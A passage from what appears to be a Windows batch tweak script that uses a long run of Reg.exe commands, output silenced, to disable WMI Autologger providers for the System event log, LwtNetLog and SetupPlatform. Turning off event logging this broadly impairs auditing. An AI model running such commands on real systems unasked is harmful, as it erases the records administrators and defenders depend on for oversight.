Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c18672d1-dc18-4dfd-91e4-170cf37160cf}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c26c4f3c-3f66-4e99-8f8a-39405cfed220}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c4636a1e-7986-4646-bf10-7bc3b4a76e8e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c76baa63-ae81-421c-b425-340b4b24157f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c914f0df-835a-4a22-8c70-732c9a80c634}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cb017cd2-1f37-4e65-82bc-3e91f6a37559}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cbda4dbf-8d5d-4f69-9578-be14aa540d22}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cd9c6198-bf73-4106-803b-c17d26559018}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cdc05e28-c449-49c6-b9d2-88cf761644df}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cdead503-17f5-4a3e-b7ae-df8cc2902eb9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ce8dee0b-d539-4000-b0f8-77bed049c590}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cfc18ec0-96b1-4eba-961b-622caee05b0a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d0e22efc-ac66-4b25-a72d-382736b5e940}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d1bc9aff-2abf-4d71-9146-ecb2a986eb85}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d48ce617-33a2-4bc3-a5c7-11aa4f29619e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d5c25f9a-4d47-493e-9184-40dd397a004d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d6f68875-cdf5-43a5-a3e3-53ffd683311c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{dbe9b383-7cf3-4331-91cc-a3cb16a3b538}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{dd70bc80-ef44-421b-8ac3-cd31da613a4e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{de29cf61-5ee6-43ff-9aac-959c4e13cc6c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{de7b24ea-73c8-4a09-985d-5bdadcfa9017}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{dea07764-0790-44de-b9c4-49677b17174f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e104fb41-6b04-4f3a-b47d-f0df2f02b954}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e2816346-87f4-4f85-95c3-0c79409aa89d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e3bac9f8-27be-4823-8d7f-1cc320c05fa7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e4480490-85b6-11dd-ad8b-0800200c9a66}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e4f68870-5ae8-4e5b-9ce7-ca9ed75b0245}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e595f735-b42a-494b-afcd-b68666945cd3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e5ba83f6-07d0-46b1-8bc7-7e669a1d31dc}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e670a5a2-ce74-4ab4-9347-61b815319f4c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e8f9af91-afbe-5a03-dfec-5d591686326c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ea216962-877b-5b73-f7c5-8aef5375959e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{eee173ef-7ed2-45de-9877-01c70a852fbd}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ef1cc15b-46c1-414e-bb95-e76b077bd51e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f029ac39-38f0-4a40-b7de-404d244004cb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f2e2ce31-0e8a-4e46-a03b-2e0fe97e93c2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f3c5e28e-63f6-49c7-a204-e48a1bc4b09d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f5d05b38-80a6-4653-825d-c414e4ab3c68}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f708c483-4880-11e6-9121-5cf37068b67b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f717d024-f5b4-4f03-9ab9-331b2dc38ffb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f9fe3908-44b8-48d9-9a32-5a763ff5ed79}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fae10392-f0af-4ac0-b8ff-9f4d920c3cdf}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fc4e8f51-7a04-4bab-8b91-6321416f72ab}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fcbb06bb-6a2a-46e3-abaa-246cb4e508b2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{01578F96-C270-4602-ADE0-578D9C29FC0C}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{0BD3506A-9030-4F76-9B88-3E8FE1F7CFB6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{12d25187-6c0d-4783-ad3a-84caa135acfd}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{15A7A4F8-0072-4EAB-ABAD-F98A4D666AED}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{1E39B4CE-D1E6-46CE-B65B-5AB05D6CC266}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{2F07E2EE-15DB-40F1-90EF-9D7BA282188A}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{314DE49F-CE63-4779-BA2B-D616F6963A88}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{315a8872-923e-4ea2-9889-33cd4754bf64}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{3CB40AAA-1145-4FB8-B27B-7E30F0454316}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{3EB875EB-8F4A-4800-A00B-E484C97D7551}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{43D1A55C-76D6-4F7E-995C-64C711E5CAFE}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{63B530F8-29C9-4880-A5B4-B8179096E7B8}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{67D07935-283A-4791-8F8D-FA9117F3E6F2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{6A1F2B00-6A90-4C38-95A5-5CAB3B056778}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{7868B0D4-1423-4681-AFDF-27913575441E}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{88CD9180-4491-4640-B571-E3BEE2527943}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{9580D7DD-0379-4658-9870-D5BE7D52D6DE}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{A6BF0DEB-3659-40AD-9F81-E25AF62CE3C7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{AB0D8EF9-866D-4D39-B83F-453F3B8F6325}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{CDEAD503-17F5-4A3E-B7AE-DF8CC2902EB9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{DF271536-4298-45E1-B0F2-E88F78619C5D}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{e6835967-e0d2-41fb-bcec-58387404e25a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog\{FBCFAC3F-8459-419F-8E48-1F0B49CDB85E}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{0063715b-eeda-4007-9429-ad526f62696e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{30336ed4-e327-447c-9de0-51b652c86108}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{331c3b3a-2005-44c2-ac5e-77220c37d6b4}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{530FB9B9-C515-4472-9313-FB346F9255E3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{75EBC33E-0CC6-49da-8CD9-8903A5222AA0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{75EBC33E-77B8-4ba8-9474-4F4A9DB2F5C6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{75EBC33E-8670-4eb6-B535-3B9D6BB222FD}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{75EBC33E-997F-49cf-B49F-ECC50184B75D}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{75EBC33E-C8AE-4f93-9CA1-683A53E20CB6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{75EBC33E-D017-4D0F-93AB-0B4F86579164}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{B9DA9FE6-AE5F-4f3e-B2FA-8E623C11DC75}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{C553CED4-9BA3-478F-98EA-906CE99C2E4F}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{f0be35f8-237b-4814-86b5-ade51192e503}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform\{f5dbaa02-15d6-4644-a784-7032d508bf64}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{01979c6a-42fa-414c-b8aa-eee2c8202018}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{04268430-d489-424d-b914-0cff741d6684}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{059f0f37-910e-4ff0-a7ee-ae8d49dd319b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{05f02597-fe85-4e67-8542-69567ab8fd4f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{06edcfeb-0fd0-4e53-acca-a6f8bbf81bcb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0b886108-1899-4d3a-9c0d-42d8fc4b9108}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0b9fdccc-451c-449c-9bd8-6756fcc6091a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0bf2fb94-7b60-4b4d-9766-e82f658df540}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0c478c5b-0351-41b1-8c58-4a6737da32e3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0d4fdc09-8c27-494a-bda0-505e4fd8adae}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0f67e49f-fe51-4e9f-b490-6f2948cc6027}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0fa2ee03-1feb-5057-3bb3-eb25521b8482}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{11c5d8ad-756a-42c2-8087-eb1b4a72a846}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{125f2cf1-2768-4d33-976e-527137d080f8}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{15a7a4f8-0072-4eab-abad-f98a4d666aed}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{15ca44ff-4d7a-4baa-bba5-0998955e531e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{199fe037-2b82-40a9-82ac-e1d46c792b99}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1b562e86-b7aa-4131-badc-b6f3a001407e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1b6b0772-251b-4d42-917d-faca166bc059}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1db28f2e-8f80-4027-8c5a-a11f7f10f62d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1e9a4978-78c2-441e-8858-75b5d1326bc5}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1f678132-5938-4686-9fdc-c8ff68f15c85}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{206f6dea-d3c5-4d10-bc72-989f03c8b84b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{21b7c16e-c5af-4a69-a74a-7245481c1b97}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2a274310-42d5-4019-b816-e4b8c7abe95c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2e35aaeb-857f-4beb-a418-2e6c0e54d988}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2e6cb42e-161d-413b-a6c1-84ca4c1e5890}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2f07e2ee-15db-40f1-90ef-9d7ba282188a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2ff3e6b7-cb90-4700-9621-443f389734ed}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{306c4e0b-e148-543d-315b-c618eb93157c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{30e1d284-5d88-459c-83fd-6345b39b19ec}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{331c3b3a-2005-44c2-ac5e-77220c37d6b4}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{355c44fe-0c8e-4bf8-be28-8bc7b5a42720}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3629dd4d-d6f1-4302-a623-0768b51501c7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{36c23e18-0e66-11d9-bbeb-505054503030}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3903d5b9-988d-4c31-9ccd-4022f96703f0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3cb2a168-fe19-4a4e-bdad-dcf422f13473}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3e59a529-b0b3-4a11-8129-9ffe6bb46eb9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3f471139-acb7-4a01-b7a7-ff5da4ba2d43}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3ff37a1c-a68d-4d6e-8c9b-f79e8b16c482}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{40783728-8921-45d0-b231-919037b4b4fd}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{412bdff2-a8c4-470d-8f33-63fe0d8c20e2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{43e63da5-41d1-4fbf-aded-1bbed98fdd1d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{45eec9e5-4a1b-5446-7ad8-a4ab1313c437}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{46c78e5c-a213-46a8-8a6b-622f6916201d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{47bc9477-a8ba-452e-b951-4f2ed3593cf9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{47bfa2b7-bd54-4fac-b70b-29021084ca8f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{494e7a3d-8db9-4ec4-b43e-2844af6e38d6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4af188ac-e9c4-4c11-b07b-1fabc07dfeb2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
